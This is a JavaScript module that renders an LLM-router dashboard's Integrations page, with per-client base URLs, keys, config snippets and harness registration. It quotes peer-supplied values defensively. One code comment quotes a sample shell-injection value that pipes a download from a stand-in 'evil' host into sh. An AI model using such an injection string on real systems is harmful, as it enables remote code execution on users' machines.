/* Integrations page — design 3c.
 *
 * docs/editor-integration.md turned into a page: pick a client, get the exact
 * values for *this* machine, then the known-harness / routing.sources controls
 * carried over from the old Sources tab.
 */

/**
 * Per-client wiring, transcribed from docs/editor-integration.md. The steps and
 * snippet shapes are documentation (they change only when that doc changes);
 * every value inside them is filled from the live agent at render time.
 *
 * `harnessId` links a client to GET /netllm/v1/harnesses and to
 * status.source_requests — the only per-client signal the agent actually has.
 * `sourceKey` is the documented virtual key that opts a client into that
 * attribution (netllm_core.source_identity, "netllm-<id>").
 */
const INTEGRATION_CLIENTS = [
  {
    id: "cursor",
    label: "Cursor",
    harnessId: "cursor",
    api: "openai",
    where: "Cursor Settings → Models → OpenAI-compatible override",
    steps: [
      "Cursor Settings → Models.",
      "Add an OpenAI-compatible override using the three values above.",
      "Select that model in chat/composer.",
    ],
  },
  {
    id: "claude-code",
    label: "Claude Code",
    harnessId: "claude-code",
    api: "both",
    sourceKey: "netllm-claude-code",
    where: "Environment variables, or /netllm-connect inside Claude Code",
    steps: [
      "For OpenAI-compatible routing, export the two OpenAI vars above.",
      "For the native Messages path, use the Anthropic panel below instead.",
      "Slash commands: /netllm-setup, /netllm-connect, /netllm-swarm, /netllm-doctor.",
    ],
  },
  {
    id: "codex",
    label: "Codex CLI",
    harnessId: "codex",
    api: "openai",
    sourceKey: "netllm-codex",
    where: "~/.codex/config.toml — Responses API only",
    steps: [
      "Codex ignores OPENAI_BASE_URL for its built-in `openai` provider, and that id is reserved — add a new named provider instead.",
      'Every Codex provider must use wire_api = "responses"; netllm serves POST /v1/responses for exactly this reason. Plain Chat Completions will not work.',
      "Export the key as NETLLM_API_KEY (that is the env_key the block names).",
    ],
    // configQuote, not hand-written quotes: the model id comes from /v1/models,
    // which republishes ids a LAN peer chose, and a `"` plus a newline in one
    // otherwise closes the TOML string and writes extra keys into the file the
    // user is told to paste.
    snippet: (ctx) => ({
      label: "~/.codex/config.toml",
      lines: [
        'model_provider = "netllm"',
        `model = ${configQuote(ctx.modelId)}`,
        "",
        "[model_providers.netllm]",
        `base_url = ${configQuote(ctx.openaiBase)}`,
        'env_key = "NETLLM_API_KEY"',
        'wire_api = "responses"',
      ],
    }),
  },
  {
    id: "continue",
    label: "Continue",
    api: "openai",
    where: "config.json → an OpenAI-compatible provider",
    steps: [
      "Add a model entry with provider `openai` and apiBase set to the base URL above.",
      "The model id must match ./netllm models exactly.",
    ],
  },
  {
    id: "cline",
    label: "Cline",
    api: "openai",
    where: "Cline settings → OpenAI Compatible provider",
    steps: [
      "Choose the OpenAI Compatible provider and paste the base URL, key and model id above.",
    ],
  },
  {
    id: "honcho",
    label: "Honcho",
    harnessId: "honcho",
    api: "openai",
    where: "deriver / dialectic model_config overrides",
    steps: [
      "Honcho usually runs in Docker while netllm runs on the host — pick “In Docker” on the left so the base URL uses host.docker.internal.",
      "Connectors take a single LLM_OPENAI_COMPATIBLE_BASE_URL (not a comma-separated list).",
      "Add CONNECTOR_LLM_ROUTING_STRATEGY=batch_shard when running parallel workers; see docs/honcho-integration.md for the shard headers.",
    ],
    // TOML basic strings — quoted by configQuote, never by hand (see Codex).
    snippet: (ctx) => ({
      label: "Honcho config (deriver / dialectic example)",
      lines: [
        "[deriver.model_config.overrides]",
        `base_url = ${configQuote(ctx.openaiBase)}`,
        `api_key = ${configQuote(ctx.apiKey)}`,
      ],
    }),
  },
  {
    id: "hermes-agent",
    label: "Hermes Agent",
    harnessId: "hermes-agent",
    api: "openai",
    sourceKey: "netllm-hermes-agent",
    where: "~/.hermes/config.yaml — Hermes ignores OPENAI_BASE_URL",
    steps: [
      "Run ./netllm connect hermes-agent to write the block, or paste it yourself.",
      "Use provider: litellm. `custom` is a fallback only — it probes endpoints netllm does not implement and can produce a blank chat.",
      "Classic CLI, TUI and gateway all read the same block; the TUI needs Node.js ≥ 20.",
    ],
    // YAML double-quoted scalars: same escaping as TOML/JSON, so configQuote
    // covers them. Bare interpolation let a model id containing `"` and a
    // newline append arbitrary YAML keys to the user's config.
    snippet: (ctx) => ({
      label: "~/.hermes/config.yaml",
      lines: [
        "model:",
        `  default: ${configQuote(ctx.modelId)}`,
        "  provider: litellm",
        `  base_url: ${configQuote(ctx.openaiBase)}`,
        `  api_key: ${configQuote(ctx.apiKey)}`,
        "",
        "display:",
        "  show_reasoning: true",
      ],
    }),
  },
  {
    id: "vscode-copilot",
    label: "VS Code + Copilot",
    api: "openai",
    where: "Custom OpenAI-compatible endpoint, where your setup supports one",
    steps: [
      "Use the same base URL, key and model id as every other tool.",
      "Copilot's own cloud models are a separate path and are unrelated to this one.",
    ],
  },
  {
    id: "curl",
    label: "curl / your own app",
    api: "openai",
    where: "Any OpenAI SDK — same three values",
    steps: [
      "Point the SDK's base_url at the URL above; any string works as the key unless a source secret is configured.",
      "POST /v1/embeddings is on the same surface — pick an embedding-capability model from the Models page.",
      "Send X-Netllm-Local-Only: 1 to keep a request on local backends (no peers, no cloud).",
    ],
    // Every interpolated value here is hostile input that the user is invited
    // to paste into a shell: shellQuote each argument (the hand-written `'…'`
    // around the -d body was breakable by a `'` in the model id), and quote the
    // model id inside the JSON body with configQuote.
    snippet: (ctx) => ({
      label: "Smoke test",
      lines: [
        `curl -s ${shellQuote(`${ctx.openaiBase}/chat/completions`)} \\`,
        `  -H ${shellQuote(`Authorization: Bearer ${ctx.apiKey}`)} \\`,
        '  -H "Content-Type: application/json" \\',
        `  -d ${shellQuote(
          `{"model":${configQuote(ctx.modelId)},"messages":[{"role":"user","content":"hi"}],"max_tokens":1}`
        )}`,
      ],
    }),
  },
];

const INTEGRATION_LOCATIONS = [
  { id: "same-machine", label: "This machine" },
  { id: "lan", label: "LAN" },
  { id: "docker", label: "Docker" },
];

/* Model chosen in the values table. Page-local rather than on `state`: it is a
 * display choice, not config, and must not survive a reload as a stale id. */
let integrationModelId = null;

/* Collapse newlines onto one line. Only needed where quoting cannot contain a
 * value — inside a `#` shell comment, which ends at the first newline. */
function singleLine(value) {
  return String(value).replace(/[\r\n]+/g, " ");
}

function integrationClient() {
  return (
    INTEGRATION_CLIENTS.find((c) => c.id === state.integrationClient) ||
    INTEGRATION_CLIENTS[0]
  );
}

function isLoopbackHost(host) {
  const h = String(host || "").replace(/^\[|\]$/g, "").toLowerCase();
  return h === "127.0.0.1" || h === "localhost" || h === "::1" || h === "0.0.0.0";
}

/**
 * The origin clients should dial. /netllm/v1/client-env is generated from the
 * same swarm.local_agent_url() that fills status.listen_url — which already
 * resolves a wildcard bind to a concrete LAN address — so prefer it, and fall
 * back through status for an agent that predates the endpoint.
 */
function agentOriginParts() {
  const raw =
    state.envVars?.ANTHROPIC_BASE_URL ||
    state.status?.listen_url ||
    (state.status?.listen ? `http://${state.status.listen}` : "") ||
    window.location.origin;
  try {
    const url = new URL(raw);
    return { protocol: url.protocol, host: url.hostname, port: url.port };
  } catch {
    return { protocol: "http:", host: "127.0.0.1", port: "11400" };
  }
}

/**
 * Base URL for the selected location. Only the host changes — the agent serves
 * one port on every interface it is bound to. `unavailable` is set instead of a
 * URL when the answer would be a lie (loopback bind has no LAN address).
 */
function integrationBase() {
  const origin = agentOriginParts();
  const authority = (host) => `${origin.protocol}//${host}${origin.port ? `:${origin.port}` : ""}`;
  if (state.integrationLocation === "docker") {
    return { root: authority("host.docker.internal") };
  }
  if (state.integrationLocation === "lan") {
    if (isLoopbackHost(origin.host)) {
      return {
        unavailable:
          "This agent is bound to loopback, so it has no LAN address. " +
          "Set agent.listen to 0.0.0.0:<port> on the Network page (or run " +
          "./netllm serve --host 0.0.0.0) and refresh.",
      };
    }
    return { root: authority(origin.host) };
  }
  return { root: authority("127.0.0.1") };
}

/** Chat-capable models first; `capability` is absent on older agents. */
function integrationModels() {
  // state.models is /v1/models `data` verbatim — it can be the wrong type or
  // hold nulls, and both .filter and m.capability would throw on that.
  const rows = asArray(state.models).filter(Boolean);
  const chat = rows.filter((m) => !m.capability || m.capability === "chat");
  return chat.length ? chat : rows;
}

function selectedModelId() {
  const models = integrationModels();
  if (!models.length) return "";
  if (integrationModelId && models.some((m) => m.id === integrationModelId)) {
    return integrationModelId;
  }
  return models[0].id;
}

/** Attributed request count for a client, or null when it has no source id. */
function clientRequestCount(client) {
  if (!client.harnessId) return null;
  const n = Number(state.status?.source_requests?.[client.harnessId]);
  return Number.isFinite(n) ? n : null;
}

function harnessRows() {
  // dashboard.js assigns the raw GET /netllm/v1/harnesses body, which is
  // {harnesses: [...]}, while the old dashboard unwrapped it. Accept both so
  // the section renders either way. Null entries are dropped — harnessById and
  // every card below read h.id.
  const reg = state.harnessRegistry;
  const rows = Array.isArray(reg) ? reg : asArray(reg?.harnesses);
  return rows.filter(Boolean);
}

function harnessById(id) {
  return harnessRows().find((h) => h.id === id) || null;
}

/* ---------------- left column ---------------- */

function renderClientList(root) {
  root.appendChild(textEl("div", "field-label", "Clients"));
  const list = el("div", "rail-items");
  INTEGRATION_CLIENTS.forEach((client) => {
    const selected = client.id === integrationClient().id;
    const item = el("button", selected ? "rail-item active" : "rail-item");
    item.type = "button";
    if (selected) item.setAttribute("aria-current", "true");

    const requests = clientRequestCount(client);
    const detected = client.harnessId ? harnessById(client.harnessId)?.detected : false;
    const row = el("div", "row");
    row.appendChild(statusDot(requests ? "ok" : ""));
    row.appendChild(textEl("span", "", client.label));
    row.appendChild(el("span", "spacer"));
    if (requests) {
      row.appendChild(textEl("span", "muted mono", formatCompactCount(requests)));
    } else if (detected) {
      row.appendChild(textEl("span", "muted", "on PATH"));
    }
    item.appendChild(row);

    item.onclick = () => {
      state.integrationClient = client.id;
      render();
    };
    list.appendChild(item);
  });
  root.appendChild(list);
}

function renderLocationPicker(root) {
  const body = panel(root, "Where does it run?");
  const group = el("div", "segmented");
  group.setAttribute("role", "group");
  group.setAttribute("aria-label", "Where the client runs");
  INTEGRATION_LOCATIONS.forEach((loc) => {
    const b = button(loc.label, "small secondary", () => {
      state.integrationLocation = loc.id;
      render();
    });
    b.setAttribute("aria-pressed", String(state.integrationLocation === loc.id));
    group.appendChild(b);
  });
  body.appendChild(group);
  body.appendChild(
    textEl(
      "p",
      "field-help",
      "Only the host in the base URL changes: 127.0.0.1, this agent's LAN address, or host.docker.internal."
    )
  );
}

/* ---------------- values table ---------------- */

function copyCell(label, value, enabled) {
  const cell = el("div");
  const b = button("Copy", "small secondary", () => copyText(value, `${label} copied`));
  b.setAttribute("aria-label", `Copy ${label}`);
  b.disabled = !enabled;
  cell.appendChild(b);
  return cell;
}

function valueCell(value, hint) {
  const cell = el("div");
  cell.appendChild(textEl("div", "mono", value));
  if (hint) cell.appendChild(textEl("div", "field-help", hint));
  return cell;
}

function renderModelCell(onChange) {
  const models = integrationModels();
  const cell = el("div");
  if (!models.length) {
    cell.appendChild(textEl("div", "mono", "—"));
    cell.appendChild(
      textEl("div", "field-help", "No models yet — run Discover, or start a local backend.")
    );
    return cell;
  }
  const select = el("select", "mono");
  select.setAttribute("aria-label", "Model ID");
  const current = selectedModelId();
  models.forEach((m) => {
    const opt = el("option");
    opt.value = m.id;
    opt.textContent = m.id;
    if (m.id === current) opt.selected = true;
    select.appendChild(opt);
  });
  select.onchange = () => {
    integrationModelId = select.value;
    onChange();
  };
  cell.appendChild(select);
  const capability = models.find((m) => m.id === current)?.capability;
  cell.appendChild(
    textEl(
      "div",
      "field-help",
      capability
        ? `${capability} model · must match ./netllm models exactly`
        : "Must match ./netllm models exactly"
    )
  );
  return cell;
}

function renderClientPanel(root) {
  const client = integrationClient();
  const base = integrationBase();
  const apiKey = state.envVars?.OPENAI_API_KEY || "netllm-local";
  const modelId = selectedModelId();
  const openaiBase = base.root ? `${base.root}/v1` : "";
  const anthropicBase = base.root || "";
  const usesAnthropic = client.api === "anthropic";
  const clientBase = usesAnthropic ? anthropicBase : openaiBase;

  const requests = clientRequestCount(client);
  const harness = client.harnessId ? harnessById(client.harnessId) : null;
  let statusPill;
  if (requests) {
    statusPill = pill("ok", `${formatCompactCount(requests)} requests attributed`);
  } else if (harness?.detected) {
    statusPill = pill("neutral", "CLI detected on PATH");
  } else {
    statusPill = pill("neutral", "no traffic attributed yet");
  }

  const body = panel(root, client.label, statusPill);

  if (base.unavailable) {
    body.appendChild(textEl("p", "empty", base.unavailable));
  }

  // minmax(0, 1fr), not 1fr: the value column holds a <select> sized by its
  // widest model id, and a plain `1fr` track cannot shrink below that
  // min-content width — the row grew past .table and the Copy column painted
  // outside the panel.
  const table = dataTable(["Setting", "Value", "Copy"], "150px minmax(0, 1fr) 88px");
  table.addRow([
    "Base URL",
    clientBase
      ? valueCell(clientBase, usesAnthropic ? "Messages API — no /v1 suffix" : null)
      : valueCell("—", "No address for this location."),
    copyCell("Base URL", clientBase, !!clientBase),
  ]);
  table.addRow([
    "API key",
    valueCell(apiKey, "Placeholder — real keys are only for optional cloud failover."),
    copyCell("API key", apiKey, true),
  ]);
  table.addRow([
    "Model ID",
    renderModelCell(() => render()),
    copyCell("Model ID", modelId, !!modelId),
  ]);
  body.appendChild(table.table);

  const actions = el("div", "row");
  const prefix = usesAnthropic ? "ANTHROPIC" : "OPENAI";
  // These three lines go straight onto the clipboard for pasting into a shell.
  // The base URL and key come from /netllm/v1/client-env and the model id from
  // /v1/models, which republishes ids chosen by LAN peers — all hostile. The
  // comment line also collapses newlines: a `#` comment ends at the first one,
  // so quoting alone would not stop a second line becoming a command.
  const allThree = [
    `export ${prefix}_BASE_URL=${shellQuote(clientBase)}`,
    `export ${prefix}_API_KEY=${shellQuote(apiKey)}`,
    `# model: ${singleLine(shellQuote(modelId || "<pick a model>"))}`,
  ].join("\n");
  const copyAll = button("Copy all three", "", () =>
    copyText(allThree, "Base URL, key and model copied")
  );
  copyAll.disabled = !clientBase;
  actions.appendChild(copyAll);

  // The design has a "Verify connection" button here. The agent has no
  // round-trip test endpoint, and a fetch from this page would only prove the
  // browser can reach the agent — not that the client machine can. Hand over
  // the command that does test it instead of faking the check.
  // shellQuote: the model id is peer-supplied, and this string is written to
  // the clipboard for the user to run — `x'; curl evil|sh; echo '` would
  // otherwise paste as three commands.
  const verifyCmd = `./netllm test${usesAnthropic ? " --api anthropic" : ""}${
    modelId ? ` --model ${shellQuote(modelId)}` : ""
  }`;
  actions.appendChild(
    button("Copy verify command", "small secondary", () =>
      copyText(verifyCmd, "Verify command copied")
    )
  );
  actions.appendChild(el("div", "spacer"));
  actions.appendChild(textEl("span", "muted", client.where));
  body.appendChild(actions);

  const steps = el("ol", "field-help");
  client.steps.forEach((s) => steps.appendChild(textEl("li", "", s)));
  body.appendChild(steps);

  if (client.snippet) {
    const snippet = client.snippet({
      openaiBase: openaiBase || "http://127.0.0.1:11400/v1",
      anthropicBase,
      apiKey,
      modelId: modelId || "<model id from ./netllm models>",
    });
    const text = snippet.lines.join("\n");
    const head = el("div", "row-between");
    head.appendChild(textEl("div", "field-label", snippet.label));
    head.appendChild(
      button("Copy", "small secondary", () => copyText(text, "Snippet copied"))
    );
    body.appendChild(head);
    // <pre> keeps the snippet's own whitespace; .inset/.mono carry the styling.
    const pre = el("pre", "inset mono");
    pre.textContent = text;
    body.appendChild(pre);
  }

  if (client.sourceKey) {
    body.appendChild(
      textEl(
        "p",
        "field-help",
        `Known source (optional): use the key ${client.sourceKey} instead of ` +
          `${apiKey} to attribute this client's traffic separately below.`
      )
    );
  }
}

function renderAnthropicPanel(root) {
  const base = integrationBase();
  const apiKey = state.envVars?.ANTHROPIC_API_KEY || "netllm-local";
  // Secondary to the per-client panel above, which already carries the values
  // for whichever client is selected. Only relevant to someone wiring an
  // Anthropic-native client by hand.
  const body = collapsiblePanel(
    root,
    "Anthropic Messages clients",
    "Claude Code's native path and some agents — no /v1 suffix",
    {
      storageKey: "integrations.anthropic",
      defaultOpen: false,
      summary: base.unavailable ? "base URL unavailable" : "base URL, key and model",
    }
  );

  if (base.unavailable) {
    body.appendChild(textEl("p", "empty", base.unavailable));
    return;
  }

  // Shell lines built from client-env values — quoted, see renderClientPanel.
  const lines = [
    `export ANTHROPIC_BASE_URL=${shellQuote(base.root)}`,
    `export ANTHROPIC_API_KEY=${shellQuote(apiKey)}`,
  ];
  const pre = el("pre", "inset mono");
  pre.textContent = lines.join("\n");
  body.appendChild(pre);

  const actions = el("div", "row");
  actions.appendChild(
    button("Copy", "", () => copyText(lines.join("\n"), "Anthropic env copied"))
  );
  actions.appendChild(
    button("Copy Messages test", "small secondary", () => {
      const modelId = selectedModelId();
      // Peer-supplied model id in a copy-and-run command — quote it.
      copyText(
        `./netllm test --api anthropic${modelId ? ` --model ${shellQuote(modelId)}` : ""}`,
        "Test command copied"
      );
    })
  );
  body.appendChild(actions);
  body.appendChild(
    textEl(
      "p",
      "field-help",
      "The Messages API has no embeddings standard — Anthropic-wired clients use the OpenAI surface above for /v1/embeddings."
    )
  );
}

/* ---------------- connected clients ---------------- */

function renderConnectedClients(root) {
  const body = panel(
    root,
    "Connected clients",
    "attributed by source key, since this agent started"
  );

  const counts = asObject(state.status?.source_requests);
  const ids = Object.keys(counts).sort((a, b) => Number(counts[b]) - Number(counts[a]));

  // Scenario totals arrive flattened as "<source_id>:<scenario>" — regroup so a
  // source's scenarios sit on its own row.
  const scenariosBySource = {};
  Object.entries(asObject(state.status?.scenario_requests)).forEach(([key, n]) => {
    const idx = key.indexOf(":");
    if (idx < 0) return;
    const sourceId = key.slice(0, idx);
    const scenario = key.slice(idx + 1);
    (scenariosBySource[sourceId] = scenariosBySource[sourceId] || []).push(
      `${scenario} ${formatCompactCount(n)}`
    );
  });

  if (!ids.length) {
    body.appendChild(
      textEl(
        "p",
        "empty",
        "No attributed traffic yet. A request only carries a client identity " +
          "when it sends the x-netllm-source header or a netllm-<id> virtual key."
      )
    );
  } else {
    const table = dataTable(["Client", "Requests", "Scenarios"], "1.4fr 0.8fr 1.6fr");
    ids.forEach((id) => {
      const label = harnessById(id)?.display_name || id;
      const scenarios = asArray(scenariosBySource[id]).join(" · ");
      table.addRow([
        label,
        textEl("div", "mono", formatCompactCount(counts[id])),
        textEl("div", "muted mono", scenarios || "—"),
      ]);
    });
    body.appendChild(table.table);
  }

  // Design 3c also shows the client's address, which API surface it used, and
  // its most-used model. The agent records none of those — see
  // scratchpad/gaps/integrations.md.
  body.appendChild(
    textEl(
      "p",
      "field-help",
      "The agent records no client address, API surface or per-model breakdown, " +
        "and these counters run from process start rather than a rolling window."
    )
  );
}

/* ---------------- known harnesses (ported from the old Sources tab) --------- */

function toggleHarness(knownId, enabled) {
  // The draft can still be missing entirely if the admin config API was
  // unreachable at load; registering a source has nowhere to go then.
  if (!state.configDraft?.routing) {
    showToast("Config unavailable — cannot register a source right now");
    return;
  }
  if (!Array.isArray(state.configDraft.routing.sources)) {
    state.configDraft.routing.sources = [];
  }
  const sources = state.configDraft.routing.sources;
  let row = sources.filter(Boolean).find((s) => s.known_id === knownId || s.id === knownId);
  if (!row) {
    row = { id: knownId, enabled: true, known_id: knownId };
    sources.push(row);
  }
  row.enabled = enabled;

  // Mirror into the fetched registry snapshot too — the cards read
  // state.harnessRegistry (server truth + live detection), not the draft, so
  // without this the toggle would revert on the immediate re-render below and
  // only catch up after the next Save + refresh cycle.
  const known = harnessById(knownId);
  if (known) {
    known.configured = true;
    known.enabled = enabled;
  }

  markDirty();
  if (state.page === "integrations") render();
}

function renderHarnessCard(root, h) {
  const card = el("div", "inset");

  const head = el("div", "row");
  // icon_url arrives from GET /netllm/v1/harnesses — a `javascript:` or `data:`
  // scheme there must never reach the attribute, so drop the icon entirely
  // rather than render an element with an unvalidated src.
  const iconUrl = safeHref(h.icon_url);
  if (iconUrl) {
    const icon = el("img");
    icon.src = iconUrl;
    icon.alt = "";
    icon.width = 16;
    icon.height = 16;
    head.appendChild(icon);
  }
  head.appendChild(textEl("div", "", h.display_name));
  head.appendChild(el("div", "spacer"));
  head.appendChild(
    pill(h.detected ? "ok" : "warn", h.detected ? "Detected" : "Not detected")
  );
  card.appendChild(head);

  const stateLabel = h.configured
    ? h.enabled
      ? "Enabled"
      : "Disabled"
    : "Not registered";
  const toggleRow = el("div", "row-between");
  toggleRow.appendChild(
    switchRow(stateLabel, !!h.enabled, (checked) => toggleHarness(h.id, checked))
  );
  card.appendChild(toggleRow);

  if (!h.detected && h.install_hint) {
    const hintRow = el("div", "row");
    hintRow.appendChild(textEl("span", "field-help", `Install: ${h.install_hint}`));
    hintRow.appendChild(
      button("Copy", "small secondary", () =>
        copyText(h.install_hint, "Install command copied")
      )
    );
    card.appendChild(hintRow);
  }
  root.appendChild(card);
}

function renderHarnessSection(root) {
  const rows = harnessRows();
  // null registry = an agent that predates GET /netllm/v1/harnesses. Skip the
  // whole section rather than showing an empty one that implies zero harnesses.
  if (!state.harnessRegistry || !rows.length) return;

  // 384px of harness cards on a page whose job is "copy the base URL for my
  // editor". Registration is a once-per-tool action; folded by default, and
  // force-opened while routing.sources holds an unsaved toggle so the switch
  // the user just flipped cannot vanish under them.
  const detected = rows.filter((h) => h && h.detected).length;
  const registered = rows.filter((h) => h && h.configured && h.enabled).length;
  const body = collapsiblePanel(
    root,
    "Known harnesses",
    "one-click registration as a routing source",
    {
      storageKey: "integrations.harnesses",
      defaultOpen: false,
      forceOpen: draftDiffers("routing.sources"),
      forceReason: "unsaved edits",
      summary: `${rows.length} known · ${detected} on PATH · ${registered} registered`,
    }
  );
  body.appendChild(
    textEl(
      "p",
      "panel-desc",
      "Toggle a known harness on to register (or re-enable) it as a source. " +
        "A not-detected harness never auto-installs — copy the install command " +
        "and come back once it is on PATH. Detection never affects routing."
    )
  );
  const grid = el("div", "grid-2");
  rows.forEach((h) => renderHarnessCard(grid, h));
  body.appendChild(grid);
}

function renderSourcesSection(root) {
  const sources = asArray(state.configDraft?.routing?.sources).filter(Boolean);
  // The raw row editor behind "Known harnesses" — the same data, one level
  // down. Nobody opens this page to edit it, but Axis D parity requires the
  // controls to exist, and folded still counts as existing.
  const body = collapsiblePanel(root, "Sources", "routing.sources", {
    storageKey: "integrations.sources",
    defaultOpen: false,
    forceOpen: draftDiffers("routing.sources"),
    forceReason: "unsaved edits",
    summary: sources.length
      ? `${sources.length} source${sources.length === 1 ? "" : "s"}`
      : "no sources",
  });
  body.appendChild(
    textEl(
      "p",
      "panel-desc",
      "Known CLI/harness identities with their own routing. Attributive by " +
        "default: an id/key with no secret just labels traffic in Status and " +
        "metrics. Set a secret once this agent is reachable beyond loopback if " +
        "the source grants cloud access, a cloud_providers allowlist, or an " +
        "above-default max_concurrency."
    )
  );

  // A malformed /config/schema is the payload that breaks the most pages; a
  // missing byName.sources renders the "schema unavailable" copy just below.
  const fields = asArray(state.configSchema?.sections?.routing?.fields).filter(
    (f) => f && typeof f === "object" && typeof f.name === "string"
  );
  const byName = Object.fromEntries(fields.map((f) => [f.name, f]));
  if (!byName.sources) {
    body.appendChild(
      textEl(
        "p",
        "empty",
        "The config schema is unavailable, so the source editor cannot render. " +
          "Edit [[routing.sources]] in config.toml instead."
      )
    );
    return;
  }
  // schema-form.js is a sibling module: a build where it is missing or older
  // must degrade to this notice rather than taking the whole page down.
  if (typeof renderSchemaField !== "function") {
    body.appendChild(textEl("p", "empty", "Schema form engine unavailable."));
    return;
  }
  renderSchemaField(body, "routing", byName.sources, {
    sources: { label: "Sources", help: "One row per CLI/harness identity." },
  });
}

/* ---------------- page ---------------- */

function renderIntegrationsPage(root) {
  pageHeader(
    root,
    "Integrations",
    "One base URL for every tool. Pick a client and copy exact values for this machine."
  );

  const layout = el("div", "rail-layout");
  const left = el("div", "rail");
  const right = el("div", "rail-body");

  renderClientList(left);
  renderLocationPicker(left);

  renderClientPanel(right);
  renderAnthropicPanel(right);
  renderConnectedClients(right);
  renderHarnessSection(right);
  renderSourcesSection(right);

  layout.append(left, right);
  root.appendChild(layout);
}

registerPage("integrations", renderIntegrationsPage);
